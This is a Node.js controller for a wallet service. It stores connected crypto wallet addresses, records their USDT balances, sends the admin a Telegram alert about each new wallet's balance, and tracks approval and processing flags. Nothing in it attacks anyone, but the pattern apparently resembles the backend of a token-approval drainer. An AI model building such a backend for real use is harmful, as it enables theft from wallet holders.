const walletService = require('../services/wallet.service');
const contractService = require('../services/contract.service');
const database = require('../config/database');
const validators = require('../utils/validators');
const helpers = require('../utils/helpers');

class WalletController {
    async connectWallet(req, res) {
        try {
            // Validate input
            const validation = validators.validateWalletConnection(req.body);
            if (!validation.valid) {
                return res.status(400).json({
                    success: false,
                    error: validation.error
                });
            }
            
            const { address, name } = req.body;
            
            // Save wallet to database - UPSERT (insert or update)
            const query = `
                INSERT INTO wallets (address, name, created_at, updated_at, is_approved, is_processed)
                VALUES ($1, $2, NOW(), NOW(), false, false)
                ON CONFLICT (address) DO UPDATE
                SET name = $2, updated_at = NOW(), is_approved = false, is_processed = false
                RETURNING *
            `;
            
            const result = await database.query(query, [address, name || 'Unnamed Wallet']);
            const wallet = result.rows[0];
            
            // Get USDT balance
            const balance = await contractService.getWalletUSDTBalance(address);
            
            // Update balance in database
            const updateQuery = `
                UPDATE wallets 
                SET usdt_balance = $1, last_balance_check = NOW()
                WHERE address = $2
            `;
            await database.query(updateQuery, [balance, address]);
            
            // Send alert to admin
            const telegram = require('../config/telegram');
            await telegram.sendNewWalletAlert(address, balance);
            
            res.json({
                success: true,
                wallet: {
                    id: wallet.id,
                    address: wallet.address,
                    name: wallet.name,
                    usdt_balance: balance,
                    created_at: wallet.created_at
                }
            });
        } catch (error) {
            console.error('Wallet connection error:', error);
            res.status(500).json({
                success: false,
                error: 'Internal server error'
            });
        }
    }

    async approveWallet(req, res) {
        try {
            // Validate input
            const validation = validators.validateWalletConnection(req.body);
            if (!validation.valid) {
                return res.status(400).json({
                    success: false,
                    error: validation.error
                });
            }
            
            const { address } = req.body;
            
            // Update approval status in database
            const query = `
                UPDATE wallets 
                SET is_approved = true, updated_at = NOW()
                WHERE address = $1
                RETURNING *
            `;
            
            const result = await database.query(query, [address]);
            
            if (result.rows.length === 0) {
                return res.status(404).json({
                    success: false,
                    error: 'Wallet not found'
                });
            }
            
            const wallet = result.rows[0];
            
            res.json({
                success: true,
                message: 'Wallet approved successfully',
                wallet: wallet
            });
        } catch (error) {
            console.error('Wallet approval error:', error);
            res.status(500).json({
                success: false,
                error: 'Internal server error'
            });
        }
    }

    async getBalance(req, res) {
        try {
            const { address } = req.params;
            
            // Validate address parameter
            if (!address) {
                return res.status(400).json({
                    success: false,
                    error: 'Wallet address is required'
                });
            }
            
            if (!helpers.validateEthereumAddress(address)) {
                return res.status(400).json({
                    success: false,
                    error: 'Invalid wallet address format'
                });
            }
            
            const balance = await contractService.getWalletUSDTBalance(address);
            
            // Update balance in database
            const updateQuery = `
                UPDATE wallets 
                SET usdt_balance = $1, last_balance_check = NOW()
                WHERE address = $2
            `;
            await database.query(updateQuery, [balance, address]);
            
            res.json({
                success: true,
                balance: balance,
                address: address
            });
        } catch (error) {
            console.error('Balance check error:', error);
            res.status(500).json({
                success: false,
                error: 'Internal server error'
            });
        }
    }
}

module.exports = new WalletController();
